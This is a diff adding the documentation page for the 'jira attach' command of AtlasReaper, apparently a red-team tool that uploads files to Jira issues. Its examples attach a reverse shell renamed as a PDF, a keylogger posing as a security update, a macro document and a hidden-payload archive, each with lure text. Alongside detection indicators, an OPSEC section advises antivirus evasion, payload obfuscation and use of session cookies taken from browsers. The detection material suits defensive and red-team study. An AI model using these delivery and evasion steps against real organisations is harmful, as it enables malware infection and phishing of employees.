@@ -1,0 +1,233 @@
+---
+title: 'attach'
+description: 'Attach a file to a Jira issue'
+icon: 'paperclip'
+---
+
+## Overview
+
+The `jira attach` command uploads a file as an attachment to an existing Jira issue. This command is useful for offensive operations involving payload delivery, file exfiltration staging, or social engineering scenarios where malicious files are disguised as legitimate business documents. Files are attached with customizable names and can be referenced in subsequent operations.
+
+## Syntax
+
+```bash
+.\AtlasReaper.exe jira attach [options]
+```
+
+## Required Parameters
+
+<ParamField path="--url" type="string" required>
+  The base URL of the target Jira instance (e.g., `https://company.atlassian.net`)
+</ParamField>
+
+<ParamField path="--file" type="string" required>
+  Path to the file to upload. Can be any file type (executables, documents, archives, etc.)
+</ParamField>
+
+<ParamField path="--issue" type="string" required>
+  The issue key to attach the file to (e.g., `PROJ-123`)
+</ParamField>
+
+## Optional Parameters
+
+<ParamField path="--cookie" type="string">
+  Authentication cookie (`cloud.session.token` or `tenant.session.token`). Required for authenticated attachment uploads
+</ParamField>
+
+<ParamField path="--name" type="string">
+  Custom filename for the attachment. If not specified, defaults to the original filename. Useful for disguising file types or making files appear legitimate
+</ParamField>
+
+<ParamField path="--comment" type="string" default="untitled">
+  Comment text associated with the uploaded file (currently defaults to "untitled")
+</ParamField>
+
+<ParamField path="--text" type="string">
+  Additional text to add context to the attachment on the issue page (e.g., "I uploaded this file, please take a look")
+</ParamField>
+
+<ParamField path="--attachment" type="string">
+  Attachment ID of an existing attachment to reference (if the attachment is already created)
+</ParamField>
+
+<ParamField path="--output" type="string">
+  Save command output to a specified file
+</ParamField>
+
+## Examples
+
+### Basic File Attachment
+
+Attach a malicious executable disguised as a PDF:
+
+```bash
+.\AtlasReaper.exe jira attach \
+  --url https://company.atlassian.net \
+  --issue PROJ-123 \
+  --file C:\payloads\reverse_shell.exe \
+  --name "Q4_Financial_Report.pdf" \
+  --cookie $cookie
+```
+
+### Social Engineering with Context
+
+Upload a file with convincing context text:
+
+```bash
+.\AtlasReaper.exe jira attach \
+  --url https://company.atlassian.net \
+  --issue IT-456 \
+  --file C:\tools\keylogger.exe \
+  --name "IT_Security_Update.exe" \
+  --text "Please run this security update immediately. It patches the recent vulnerability." \
+  --cookie $cookie
+```
+
+### Macro-Enabled Document
+
+Attach a weaponized Office document:
+
+```bash
+.\AtlasReaper.exe jira attach \
+  --url https://company.atlassian.net \
+  --issue HR-789 \
+  --file C:\payloads\malicious_invoice.docm \
+  --name "Invoice_2024_Q3.docm" \
+  --text "Please review and approve this invoice" \
+  --cookie $cookie
+```
+
+### Archive with Hidden Payload
+
+Upload a compressed archive containing multiple files:
+
+```bash
+.\AtlasReaper.exe jira attach \
+  --url https://company.atlassian.net \
+  --issue DEV-101 \
+  --file C:\payloads\project_files.zip \
+  --name "Project_Source_Code.zip" \
+  --text "Here are the source files you requested" \
+  --cookie $cookie
+```
+
+## Use Cases
+
+<Tabs>
+  <Tab title="Red Team">
+    ### Offensive Security Applications
+
+    - **Payload Delivery**: Upload malicious executables, scripts, or documents to issues accessible by targets
+    - **Social Engineering**: Disguise malware as legitimate business files (reports, invoices, updates)
+    - **Persistence**: Host payloads on trusted infrastructure (Jira) to bypass web filtering
+    - **Credential Harvesting**: Upload files that prompt for credentials when opened
+    - **Phishing**: Combine with `addcomment` to create convincing scenarios for file execution
+    - **Data Staging**: Upload files as a staging area for lateral movement or exfiltration
+    - **Watering Hole**: Plant malicious files in frequently accessed issues
+  </Tab>
+
+  <Tab title="Blue Team">
+    ### Defensive Monitoring
+
+    - **File Type Monitoring**: Track uploads of executable files, archives, and macro-enabled documents
+    - **Anomaly Detection**: Identify unusual attachment patterns (size, frequency, file extensions)
+    - **Attachment Scanning**: Integrate AV/EDR scanning for all uploaded files
+    - **User Behavior**: Monitor for accounts uploading files at unusual times or to unexpected issues
+    - **Extension Validation**: Ensure file extensions match actual file types (detect .exe renamed as .pdf)
+    - **Incident Response**: Investigate suspicious file attachments during security events
+    - **Training**: Use command to create realistic security awareness scenarios
+  </Tab>
+</Tabs>
+
+## Output
+
+The command returns the attachment ID upon successful upload. If a file with the same name already exists, it will notify the user.
+
+Example successful output:
+```
+Uploaded Q4_Financial_Report.pdf
+Attachment Id: 10234
+```
+
+Example duplicate filename output:
+```
+Attachment already exists with the name Q4_Financial_Report.pdf
+
+    Use -a/--attachment to specify an existing attachment
+```
+
+### Output Information
+
+- **Filename**: The name of the uploaded file (as it appears in Jira)
+- **Attachment Id**: Unique identifier for the attachment (use with `jira download` command)
+- The file becomes immediately accessible to anyone with view permissions on the issue
+
+## Detection Considerations
+
+<Warning>
+**Detection Indicators**
+
+Security teams should monitor for:
+
+- Executable file uploads (.exe, .dll, .bat, .ps1, .vbs, .js)
+- Macro-enabled documents (.docm, .xlsm, .pptm)
+- Archive files that may contain hidden payloads (.zip, .rar, .7z)
+- Mismatched file extensions and MIME types
+- Uploads from unusual IP addresses or at unusual times
+- Large file uploads that could indicate data staging
+- Multiple file uploads in short timeframes
+- Attachments to issues where the uploader isn't a typical contributor
+- Files with double extensions (e.g., document.pdf.exe)
+</Warning>
+
+### Jira Audit Log Entries
+
+This command generates the following audit log events:
+- `issue_attachment_created` - Records the file upload
+- Includes: User ID, issue key, filename, file size, timestamp, IP address
+
+### Network Indicators
+
+- HTTP POST requests to `/rest/api/3/issue/{issueKey}/attachments`
+- Large HTTP POST body sizes corresponding to file uploads
+- Content-Type: multipart/form-data headers
+
+## OPSEC Considerations
+
+<Tip>
+**Operational Security Tips**
+
+To reduce detection risk when using this command:
+
+1. **File Naming**: Use convincing, context-appropriate filenames that match organizational conventions
+2. **File Types**: Choose file types commonly used in the organization (avoid suspicious extensions)
+3. **File Size**: Keep files reasonably sized to avoid triggering alerts on large uploads
+4. **Timing**: Upload during business hours when legitimate file activity is high
+5. **Issue Selection**: Attach to issues where file uploads are expected (e.g., bug reports, feature requests)
+6. **Staged Delivery**: Upload files incrementally rather than in bulk
+7. **File Obfuscation**: Use encryption, compression, or encoding to bypass basic scanning
+8. **Extension Tricks**: Be aware that some organizations scan for extension mismatches
+9. **Account Context**: Use cookies from accounts that regularly upload files
+10. **AV Evasion**: Ensure payloads are not detected by common antivirus solutions
+</Tip>
+
+### Upload Limitations
+
+- Jira instances may have maximum file size limits (typically 10-100 MB)
+- Some file types may be blocked by organizational policies
+- Files may be scanned by integrated security tools upon upload
+- Duplicate filenames are detected and rejected
+
+### Cookie Considerations
+
+- Authentication required for file uploads (anonymous uploads typically not permitted)
+- Session cookies can be extracted from user browsers using tools like SharpChrome
+- Cookie validity should be verified before large file uploads
+
+## Related Commands
+
+- [jira addcomment](/jira/addcomment) - Add comments referencing the attached file for social engineering
+- [jira listattachments](/jira/listattachments) - List attachments to verify upload or find existing files
+- [jira download](/jira/download) - Download attachments by their attachment ID
+- [jira createissue](/jira/createissue) - Create a new issue to host the attachment
+- [jira listissues](/jira/listissues) - Find appropriate issues for file attachments
